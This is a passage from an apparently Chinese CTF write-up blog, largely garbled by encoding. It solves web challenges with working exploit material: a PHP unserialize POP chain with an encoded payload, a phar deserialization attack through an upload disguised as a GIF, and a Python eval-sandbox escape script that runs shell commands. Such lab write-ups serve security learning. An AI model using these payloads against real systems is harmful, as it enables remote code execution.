class="keyword">private</span> <span class="variable">$out</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$no</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$useful1</span>;<span class="keyword">public</span> <span class="variable">$useful2</span>;<span class="keyword">public</span> <span class="variable">$useful3</span>;<span class="keyword">public</span> <span class="variable">$useful4</span>;<span class="keyword">public</span> <span class="variable">$useful5</span>;<span class="keyword">public</span> <span class="variable">$useful6</span>;<span class="keyword">public</span> <span class="variable">$useful7</span>;<span class="keyword">public</span> <span class="variable">$useful8</span>;<span class="keyword">public</span> <span class="variable">$useful9</span>;<span class="keyword">public</span> <span class="variable">$useful10</span>;<span class="keyword">public</span> <span class="variable">$useful11</span>;<span class="keyword">public</span> <span class="variable">$useful12</span>;<span class="keyword">public</span> <span class="variable">$useful13</span>;<span class="keyword">public</span> <span class="variable">$useful14</span>;<span class="keyword">public</span> <span class="variable">$useful15</span>;<span class="keyword">public</span> <span class="variable">$useful16</span>;<span class="keyword">public</span> <span class="variable">$useful17</span>;<span class="keyword">public</span> <span class="variable">$useful18</span>;<span class="keyword">public</span> <span class="variable">$useful19</span>;<span class="keyword">public</span> <span class="variable">$useful20</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;out-&gt;useful7) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is your future.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&quot;wow&quot;</span>]);     <span class="comment">//3</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;win&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;no = <span class="string">&quot;no&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;no;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="number">0</span>,-<span class="number">4</span>);</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">best64_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// You learn yesterday, you choose today, can you get to your future?</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç†ä¸€ä¸‹å¤§æ¦‚çš„é“¾å­é¡ºåº </p>
<p>yesterday::destructï¼ˆstudy&#x3D;new todayï¼‰-&gt; today::__callï¼ˆdoing&#x3D;new futureï¼‰-&gt; future::__tostring</p>
<p>ç„¶åpostä¼ å…¥wowå°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ ä½†æ˜¯æœ‰ä¸ªæ³¨æ„ç‚¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">best64_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>)))));</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">best64_decode</span>(<span class="variable">$data</span>));</span><br></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–åçš„æ•°æ®è¿˜è¦base_encode 5æ¬¡ä¼ å…¥</p>
<p>popé“¾å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">yesterday</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$learn</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$study</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$try</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">today</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$doing</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$did</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$done</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">tommoraw</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bad</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$soso</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">future</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$impossible</span>=<span class="string">&quot;How can you get here?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$out</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$no</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$useful1</span>;<span class="keyword">public</span> <span class="variable">$useful2</span>;<span class="keyword">public</span> <span class="variable">$useful3</span>;<span class="keyword">public</span> <span class="variable">$useful4</span>;<span class="keyword">public</span> <span class="variable">$useful5</span>;<span class="keyword">public</span> <span class="variable">$useful6</span>;<span class="keyword">public</span> <span class="variable">$useful7</span>;<span class="keyword">public</span> <span class="variable">$useful8</span>;<span class="keyword">public</span> <span class="variable">$useful9</span>;<span class="keyword">public</span> <span class="variable">$useful10</span>;<span class="keyword">public</span> <span class="variable">$useful11</span>;<span class="keyword">public</span> <span class="variable">$useful12</span>;<span class="keyword">public</span> <span class="variable">$useful13</span>;<span class="keyword">public</span> <span class="variable">$useful14</span>;<span class="keyword">public</span> <span class="variable">$useful15</span>;<span class="keyword">public</span> <span class="variable">$useful16</span>;<span class="keyword">public</span> <span class="variable">$useful17</span>;<span class="keyword">public</span> <span class="variable">$useful18</span>;<span class="keyword">public</span> <span class="variable">$useful19</span>;<span class="keyword">public</span> <span class="variable">$useful20</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">yesterday</span>();</span><br><span class="line"><span class="variable">$aa</span>-&gt;study = <span class="keyword">new</span> <span class="title function_ invoke__">today</span>();</span><br><span class="line"><span class="variable">$aa</span>-&gt;study-&gt;doing = <span class="keyword">new</span> <span class="title function_ invoke__">future</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20250414133152637.png" alt="image-20250414133152637"></p>
<p>nullæ›¿æ¢ä¸º%00å°±è¡Œäº† å› ä¸ºprivateå±æ€§çš„åŸå› </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZ</span><br><span class="line">XUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBoa1QxSkhVbkZhVnpBMFpVWlJlV0</span><br><span class="line">pGZEd4aVZrcEtWbTB4TUdKR1ZYZGhlazVYVTBoQ01sUldWVFZqUms1eFVXMXNUbUpGY0haWGJGcFBVM</span><br><span class="line">nMxY2sxVVdtcFNSMUp4V2xjd05HVkdVWGxpUlhSb1RXdHNOVmxyYUZkWlYxWldZWHBPVjFOSVFqSlVW</span><br><span class="line">M00xWTBaT2RFMVhkRmhTYTJ3MFYxUkplRlp0UmxaUFdFWlVWMGhDVVZsdE5WTk9iRkY1WTBWYVQxSlV</span><br><span class="line">iSGRWTWpCNFlURmtSMU5ZYUZwTmFrWllXVEJrUzFkV1JuVlhiWEJPVFVSV00xWXhZM2hPUjBwR1lraE</span><br><span class="line">dhMU5JUWxGWlYzUnlaVVpSZVdKRmRGUldNR3cyVjFSS2ExZHJNWEpYYWtaVVZsZG9lbHBITVZOV1JrW</span><br><span class="line">jBUbGRHV0ZKclduVlhWbFpyVmpKV1YyTkdWbEJTUjJoaFdXMTBjbU5zVGxoalJFSnNZWHBzZUZWc2FH</span><br><span class="line">OVZSMFpXWTBoU1lWSnRhRlJVVm1SUFpFWmFkVmR0ZEZoU2ExcDNWa2h3UWsxRk5IbFVhbHBwVFRKb1Q</span><br><span class="line">xVnJZelZqUm1SMFRsWmtUbEl4U2xwVk1qRTBZVmRLVldGSVFsVmxhMFYzVkdwS1QwNXRTalpVYkVKb1</span><br><span class="line">ZsYzVORmRZY0V0V01rcFlWV3hvYTAweWFFdFpWelZUVlVaU05sUnJOVTloZWxVeVdXcEtjMkV4WkVaT</span><br><span class="line">1dFNVlZbFJXV0ZsNlFYaGpSazVWV2taV2FHSnNTVEpXUkVwM1lXczFjbUpJVmxkaWJrSm9WbXBHZG1W</span><br><span class="line">R2JISlZhelZvVmxSb00xUnJVbXRoYlZaMFQwaHdWVTF0ZUV4VVZtUk9aVlphZEUxWGRGZE5NazR6VlR</span><br><span class="line">Ga2QwMUdVWGRQU0hCVlZrWndVRnBYTURWalJuQkhZVVU1YVZKdVFqRldiVFZQVkRGVmQyRjZUbGRTTT</span><br><span class="line">BGM1dsZHpOV05XYkRaWGEzQnBZa1p2TWxZeWVHdFpWVEZZVTJ0V1dGWXllRkZVVlZKU1RURnJlbU5JV</span><br><span class="line">2s1TlJHeDNWVEp3UjJGck1YTlhibEpoVW0xUmVsUlVRbk5qVjFKR1QxWkNUazFFUVhsV1J6VjNaRzFH</span><br><span class="line">V0ZWc2JGVmlXR2hvV1cxNFlXVnNVWGRVYTNCUFRWWktlRnBGYUhkVlIwWjBWRlJLVkZaNlZsaGFWM2g</span><br><span class="line">zVjBaa2NWSnRiRk5TTTFKM1ZraHdRazFGTkhsVWFscHBaV3hLVVZsV1ZuWmxSbXcyVTJ4a2FWWXhTbG</span><br><span class="line">xhUkU1dlZHeEZkMkY2VGxkU00wRjNXbGR6TldOV2NEWlhhM0JwWWtadk1sWXllR3RaVlRGWVUydFdVM</span><br><span class="line">WRIYUV0WlZ6VlRWVVpTTmxSck5VOWhlbXhHV1dwS2MyRXhaRVpPV0U1WVlsUldXRmw2UVhoV1ZrNVlZ</span><br><span class="line">a1pDVGxKR1JYcFhWRTUzWkdzMVJrOVlRbFJoYTFweFZGZDRZV1JHY0VkYVJFNXNVbFJGTVZVeFVtdFd</span><br><span class="line">WMFoxVldwYVZVMXVRblZVYlhSelpGWmFkV05IUmxkTlZ6azBWMWQwVTFKck1VWmlTRVpyVWxSc1VWUl</span><br><span class="line">VRWGROYkZGM1ZXNWFhRll4U2xwV1J6RTBXVmRLYzFkdWNGVldiRXBYV1ZaVk5HUXdOVVZhUjNCc1lsU</span><br><span class="line">m5kMVpFU25OVE1ERllWRmhzVjJKVVJuSldhazVyVGtaU2RHSkZjRTlOVmtwNFdrVm9kMVZIUm5SWmVr</span><br><span class="line">cFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldWalpWTVdSM1RVWlJkMDlJY0ZWV1JuQlJWV3RqTldOR2N</span><br><span class="line">FZGhSVGxwVW01Q01WWnROVTlVYkZwSVdraENWV1ZyUlhkVWFrcFBUbTFLTmxWc1FtaFdWemswVjFod1</span><br><span class="line">MxWXlTbGhWYkdoclRUSm9VVlpVUW5KTk1WcElZMFJDYkdGNmJIaFhibkJoVTIxS2MxZHFXbGhpUjFKb</span><br><span class="line">1ZGWmtTMUpXVGxsYVJYQm9ZbXhLVVZaSWNFNWxSMVp5VDFoR1ZWWkdjRXRaYkZwTFpERmtjbFJyY0U5</span><br><span class="line">TlZrcDRXa1ZvZDFWSFJuTlNWRXBVVm5wR1ZGcEhNVXRrUmxwWVlrWkNUbEpHUlhwWGJYaHZWR3MxY2s</span><br><span class="line">xVVdtbE5iWGh5VlRCV2RrMVdUbGhqUkVKVlRVUm9ObFJWVVhkUVVUMDk=1111</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¼ å…¥wow&#x3D;cat &#x2F;flagå³å¯</p>
<p><img src="/images/image-20250414134244095.png" alt="image-20250414134244095"></p>
<h2 id="ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ-å¤ä»‡"><a href="#ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ-å¤ä»‡" class="headerlink" title="ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ(å¤ä»‡)"></a><strong>ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ(å¤ä»‡)</strong></h2><p>æ¼æ´åˆ©ç”¨ç‚¹:pharåè®®æµå¯è¢«file_exists()å‡½æ•°ç›´æ¥è§¦å‘ å¯ä»¥ä¸Šä¼ .avgæ–‡ä»¶</p>
<p>é“¾å­å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">yesterday</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$learn</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$study</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$try</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">today</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$doing</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$did</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$done</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">tommoraw</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bad</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$soso</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">future</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$impossible</span>=<span class="string">&quot;How can you get here?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$out</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$no</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$useful1</span>;<span class="keyword">public</span> <span class="variable">$useful2</span>;<span class="keyword">public</span> <span class="variable">$useful3</span>;<span class="keyword">public</span> <span class="variable">$useful4</span>;<span class="keyword">public</span> <span class="variable">$useful5</span>;<span class="keyword">public</span> <span class="variable">$useful6</span>;<span class="keyword">public</span> <span class="variable">$useful7</span>;<span class="keyword">public</span> <span class="variable">$useful8</span>;<span class="keyword">public</span> <span class="variable">$useful9</span>;<span class="keyword">public</span> <span class="variable">$useful10</span>;<span class="keyword">public</span> <span class="variable">$useful11</span>;<span class="keyword">public</span> <span class="variable">$useful12</span>;<span class="keyword">public</span> <span class="variable">$useful13</span>;<span class="keyword">public</span> <span class="variable">$useful14</span>;<span class="keyword">public</span> <span class="variable">$useful15</span>;<span class="keyword">public</span> <span class="variable">$useful16</span>;<span class="keyword">public</span> <span class="variable">$useful17</span>;<span class="keyword">public</span> <span class="variable">$useful18</span>;<span class="keyword">public</span> <span class="variable">$useful19</span>;<span class="keyword">public</span> <span class="variable">$useful20</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">yesterday</span>();</span><br><span class="line"><span class="variable">$aa</span>-&gt;study = <span class="keyword">new</span> <span class="title function_ invoke__">today</span>();</span><br><span class="line"><span class="variable">$aa</span>-&gt;study-&gt;doing = <span class="keyword">new</span> <span class="title function_ invoke__">future</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;sauy.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$aa</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>php -d phar.readonly=0 -f explore.php</code></p>
<p>å°†ç”Ÿæˆçš„sauy.phpæ”¹ä¸ºatg ä¸Šä¼ æˆåŠŸå åˆ°class.php è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p>
<p>getä¼ å…¥ï¼š?filename&#x3D;phar:&#x2F;&#x2F;.&#x2F;uploads&#x2F;sauy.atg&#x2F;test.txt</p>
<p>postä¼ å…¥ï¼šwow&#x3D;env</p>
<h2 id="ç†Ÿæ‚‰çš„é…æ–¹ï¼Œç†Ÿæ‚‰çš„å‘³é“"><a href="#ç†Ÿæ‚‰çš„é…æ–¹ï¼Œç†Ÿæ‚‰çš„å‘³é“" class="headerlink" title="ç†Ÿæ‚‰çš„é…æ–¹ï¼Œç†Ÿæ‚‰çš„å‘³é“"></a><strong>ç†Ÿæ‚‰çš„é…æ–¹ï¼Œç†Ÿæ‚‰çš„å‘³é“</strong></h2><p>è¿›å»å³ä½¿æºä»£ç è´´è„¸ ä½†æ˜¯å¯æƒœæˆ‘ä¸ä¼š èµ›åå¤ç°ç®—æ˜¯å­¦åˆ°äº† è°¢è°¢å®éªŒå®¤çš„ä½¬å¤§æ•™æˆ‘</p>
<p>è€ƒç‚¹ï¼šæ²™ç®±ç»•è¿‡ pythonä»£ç æ³¨å…¥</p>
<p>æºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyramid.config <span class="keyword">import</span> Configurator</span><br><span class="line"><span class="keyword">from</span> pyramid.request <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> pyramid.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> pyramid.view <span class="keyword">import</span> view_config</span><br><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"><span class="keyword">from</span> pyramid.events <span class="keyword">import</span> NewResponse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment, BaseLoader</span><br><span class="line"></span><br><span class="line">eval_globals = &#123; <span class="comment">#é˜²æ­¢evalæ‰§è¡Œæ¶æ„ä»£ç </span></span><br><span class="line">    <span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;,      <span class="comment"># ç¦ç”¨æ‰€æœ‰å†…ç½®å‡½æ•°</span></span><br><span class="line">    <span class="string">&#x27;__import__&#x27;</span>: <span class="literal">None</span>       <span class="comment"># ç¦æ­¢åŠ¨æ€å¯¼å…¥</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkExpr</span>(<span class="params">expr_input</span>):</span><br><span class="line">    expr = re.split(<span class="string">r&quot;[-+*/]&quot;</span>, expr_input)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">exec</span>(expr_input))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(expr) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">int</span>(expr[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">int</span>(expr[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home_view</span>(<span class="params">request</span>):</span><br><span class="line">    expr_input = <span class="string">&quot;&quot;</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        expr_input = request.POST[<span class="string">&#x27;expr&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> checkExpr(expr_input):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = <span class="built_in">eval</span>(expr_input, eval_globals)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                result = e</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="string">&quot;çˆ¬ï¼&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    template_str = ã€xxxã€‘</span><br><span class="line"></span><br><span class="line">    env = Environment(loader=BaseLoader())</span><br><span class="line">    template = env.from_string(template_str)</span><br><span class="line">    rendered = template.render(expr_input=expr_input, result=result)</span><br><span class="line">    <span class="keyword">return</span> Response(rendered)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> Configurator() <span class="keyword">as</span> config:</span><br><span class="line">        config.add_route(<span class="string">&#x27;home_view&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        config.add_view(home_view, route_name=<span class="string">&#x27;home_view&#x27;</span>)</span><br><span class="line">        app = config.make_wsgi_app()</span><br><span class="line"></span><br><span class="line">    server = make_server(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9040</span>, app)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<h3 id="æ³•1ï¼šç”¨æŠ›å‡ºé”™è¯¯å®ç°RCEï¼Œç”¨æ±¡æŸ“HTTP-500çš„è¿”å›æ¶ˆæ¯å®ç°å›æ˜¾"><a href="#æ³•1ï¼šç”¨æŠ›å‡ºé”™è¯¯å®ç°RCEï¼Œç”¨æ±¡æŸ“HTTP-500çš„è¿”å›æ¶ˆæ¯å®ç°å›æ˜¾" class="headerlink" title="æ³•1ï¼šç”¨æŠ›å‡ºé”™è¯¯å®ç°RCEï¼Œç”¨æ±¡æŸ“HTTP 500çš„è¿”å›æ¶ˆæ¯å®ç°å›æ˜¾"></a>æ³•1ï¼šç”¨æŠ›å‡ºé”™è¯¯å®ç°RCEï¼Œç”¨æ±¡æŸ“HTTP 500çš„è¿”å›æ¶ˆæ¯å®ç°å›æ˜¾</h3><h4 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><p>çœ‹ä¸æ‡‚é—®ai</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;your_url&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b = re.match.__globals__[&#x27;__builtins__&#x27;]</span></span><br><span class="line"><span class="string">b[&quot;setattr&quot;](b[&#x27;__import__&#x27;](&#x27;wsgiref&#x27;).handlers.BaseHandler,&quot;error_body&quot;,b[&quot;__import__&quot;](&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read().encode())</span></span><br><span class="line"><span class="string">raise Exception(&quot;1&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">resp = requests.post(url, data = &#123;</span><br><span class="line">    <span 